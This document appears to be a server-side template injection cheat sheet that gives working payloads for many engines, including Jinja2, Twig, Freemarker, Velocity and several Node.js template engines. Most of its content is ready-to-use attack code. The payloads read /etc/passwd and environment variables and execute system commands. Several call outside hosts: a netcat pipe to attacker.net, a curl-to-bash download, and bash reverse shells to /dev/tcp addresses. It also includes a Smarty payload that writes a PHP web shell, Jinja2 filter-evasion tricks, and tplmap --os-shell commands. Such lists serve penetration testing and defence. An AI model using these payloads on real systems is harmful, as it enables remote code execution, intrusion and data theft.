# Templates Injections

> Template injection allows an attacker to include template code into an existant (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
* [Ruby](#ruby)
  * [Basic injections](#basic-injections)
  * [Retrieve /etc/passwd](#retrieve--etc-passwd)
  * [List files and directories](#list-files-and-directories)
* [Java](#java)
  * [Basic injection](#basic-injection)
  * [Retrieve the system’s environment variables](retrieve-the-system-s-environment-variables)
  * [Retrieve /etc/passwd](#retrieve--etc-passwd)
* [Twig](#twig)
  * [Basic injection](#basic-injection)
  * [Template format](#template-format)
  * [Code execution](#code-execution)
* [JavaScript - Lessjs](#lessjs)
    * [Jade (NodeJS)](#Jade-(NodeJS))
    * [Handlebars (NodeJS)](#Handlebars (NodeJS))
    * [JsRender (NodeJS)](#JsRender (NodeJS))
    * [PugJs (NodeJS)](#PugJs (NodeJS))
    * [NUNJUCKS (NodeJS)](#NUNJUCKS (NodeJS))
* [Smarty](#smarty)
* [Freemarker](#freemarker)
  * [Basic injection](#basic-injection)
  * [Code execution](#code-execution)
* [Peeble](#peeble)
  * [Basic injection](#basic-injection)
  * [Code execution](#code-execution)
* [Jade / Codepen](#jade---codepen)
* [Velocity](#velocity)
* [Mako](#mako)
* [Jinja2](#jinja2)
  * [Basic injection](#basic-injection)
  * [Template format](#template-format)
  * [Dump all used classes](#dump-all-used-classes)
  * [Dump all config variables](#dump-all-config-variables)
  * [Read remote file](#read-remote-file)
  * [Write into remote file](#write-into-remote-file)
  * [Remote Code Execution](#remote-code-execution)
  * [Filter bypass](filter-bypass)
* [Jinjava](#jinjava)
  * [Basic injection](#basic-injection)
  * [Command execution](#command-execution)
* [References](#references)

## Tools

Recommended tool: [Tplmap](https://github.com/epinna/tplmap)
e.g:

```powershell
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```

## Methodology

![SSTI cheatsheet workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true)

## Ruby

### Basic injections

ERB:

```ruby
<%= 7 * 7 %>
```

Slim:

```ruby
#{ 7 * 7 }
```

### Retrieve /etc/passwd

```ruby
<%= File.open('/etc/passwd').read %>
```

### List files and directories

```ruby
<%= Dir.entries('/') %>
```

### Code execution

Execute code using SSTI for Slim engine.

```powershell
#{ %x|env| }
```

## Java

### Basic injection

```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```

### Retrieve the system’s environment variables

```java
${T(java.lang.System).getenv()}
```

### Retrieve /etc/passwd

```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

## Twig

### Basic injection

```python
{{7*7}}
{{7*'7'}} would result in 49
```

### Template format

```python
$output = $twig > render (
  'Dear' . $_GET['custom_greeting'],
  array("first_name" => $user.first_name)
);

$output = $twig > render (
  "Dear {first_name}",
  array("first_name" => $user.first_name)
);
```

### Code execution

```python
{{self}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Jade (NodeJS)

```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

**More information**

* In Jade section of [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### Handlebars (NodeJS)

Path Traversal (more info [here](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)).

```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```

* \= Error
* ${7\*7} = ${7\*7}
* Nothing

```java
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

URLencoded:
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```

**More information**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **Template** | **Description**                         |
| ------------ | --------------------------------------- |
|              | Evaluate and render output              |
|              | Evaluate and render HTML encoded output |
|              | Comment                                 |
| and          | Allow code (disabled by default)        |

* \= 49

**Client Side**

```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```

**Server Side**

```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```

**More information**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**Example server side render**

```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```

**More information**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = No output
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = Error

```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```

**More information**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)


## Smarty

```python
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

## Freemarker

You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

### Basic injection

The template can be `${3*3}` or the legacy `#{3*3}`

### Code execution

```js
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
```

## Pebble

### Basic injection

```java
{{ someString.toUPPERCASE() }}
```

### Code execution

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

## Jade / Codepen

```python
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

## Velocity

```python
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

## Mako

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

## Jinja2

[Official website](http://jinja.pocoo.org/)
> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  

### Basic injection

```python
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
{{config.items()}}
```

Jinja2 is used by Python Web Frameworks such as Django or Flask.
The above injections have been tested on Flask application.

### Template format

```python
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}

```

### Dump all used classes

```python
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

### Dump all config variables

```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

### Read remote file

```python
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
```

### Write into remote file

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

### Remote Code Execution

Listen for connexion

```bash
nv -lnvp 8000
```

#### Exploit the SSTI by calling subprocess.Popen.
:warning: the number 396 will vary depending of the application.

```python
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

#### Exploit the SSTI by calling Popen without guessing the offset

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

#### Exploit the SSTI by writing an evil config file.

```python
# evil config
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }} 
```


### Filter bypass

```python
request.__class__
request["__class__"]
```

Bypassing `_`

```python
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```
Bypassing `{{` and `}}`
```python
{% print(expression) %} instead of {{expression}}
```

Bypassing `[` and `]`

```python
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
or
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

Bypassing `|join`

```python
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

## Jinjava

### Basic injection

```python
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```

Jinjava is an open source project developped by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

### Command execution 

Fixed by https://github.com/HubSpot/jinjava/pull/230

```python
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}


{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```


## References

* [https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
* [Yahoo! RCE via Spring Engine SSTI](https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/)
* [Ruby ERB Template injection - TrustedSec](https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
* [Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger)](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
* [PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
* [VelocityServlet Expression Language injection](https://magicbluech.github.io/2017/12/02/VelocityServlet-Expression-language-Injection/)
* [Cheatsheet - Flask & Jinja2 SSTI - Sep 3, 2018 • By phosphore](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
* [RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug](https://medium.com/@ajdumanhug/ritsec-ctf-2018-writeup-web-72a0e5aa01ad)
* [RCE in Hubspot with EL injection in HubL - @fyoorer](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw)
* [Jinja2 template injection filter bypasses - @gehaxelt, @0daywork](https://0day.work/jinja2-template-injection-filter-bypasses/)
* [Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018](https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9)
* [EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018](https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf)
* [Server Side Template Injection – on the example of Pebble - MICHAŁ BENTKOWSKI | September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
